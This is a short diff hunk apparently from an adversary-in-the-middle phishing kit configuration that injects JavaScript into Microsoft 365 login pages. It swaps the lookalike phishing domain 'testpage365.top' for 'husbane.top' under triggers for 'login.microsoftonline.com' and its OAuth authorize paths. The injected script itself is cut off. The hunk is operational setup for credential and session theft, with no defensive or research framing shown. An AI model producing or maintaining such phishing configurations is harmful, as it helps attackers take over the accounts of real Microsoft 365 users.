@@ -92,7 +92,7 @@ login:
 
 
 js_inject:
-  - trigger_domains: ['login.microsoftonline.com','login.testpage365.top']
+  - trigger_domains: ['login.microsoftonline.com','login.husbane.top']
     trigger_paths: ['/', '/common/oauth2/v2.0/authorize', '/common/oauth2/authorize', '/common/*', '/*']
     trigger_params: []
     script: |
